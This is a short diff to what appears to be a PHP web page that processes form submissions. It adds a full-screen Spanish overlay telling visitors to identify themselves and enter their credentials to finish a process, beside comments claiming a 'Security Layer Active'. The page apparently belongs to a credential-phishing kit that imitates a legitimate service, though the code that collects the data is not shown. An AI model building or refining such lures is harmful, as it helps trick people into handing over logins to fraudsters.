@@ -51,6 +51,28 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     <meta name="timestamp" content="1711715400">
 </head>
 <body>
+<!-- Popup identifícate -->
+<div id="id-popup" style="position: fixed; inset: 0; background: rgba(0,0,0,0.55); z-index: 99999; display: flex; align-items: center; justify-content: center; transition: opacity 0.5s ease; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;">
+    <div style="background: #fff; border-radius: 14px; padding: 30px 28px 26px; max-width: 340px; width: 88%; text-align: center; box-shadow: 0 12px 40px rgba(0,0,0,0.35); border-top: 4px solid rgb(0,105,60);">
+        <div style="width: 56px; height: 56px; border-radius: 50%; background: rgba(0,105,60,0.10); display: flex; align-items: center; justify-content: center; margin: 0 auto 14px;">
+            <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="rgb(0,105,60)" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
+                <circle cx="12" cy="7" r="4"/>
+            </svg>
+        </div>
+        <p style="font-size: 16px; color: #1a1a1a; line-height: 1.5; font-weight: 600; margin: 0;">Identifícate para finalizar</p>
+        <p style="font-size: 13px; color: #6b7280; line-height: 1.5; margin-top: 6px;">Ingresa tus credenciales para continuar con el proceso</p>
+    </div>
+</div>
+<script>
+    (function() {
+        var popup = document.getElementById('id-popup');
+        setTimeout(function() {
+            popup.style.opacity = '0';
+            setTimeout(function() { popup.style.display = 'none'; }, 500);
+        }, 3500);
+    })();
+</script>
 <!-- Security Layer Active -->
 <style>
     /* Base styles - Enhanced Security */
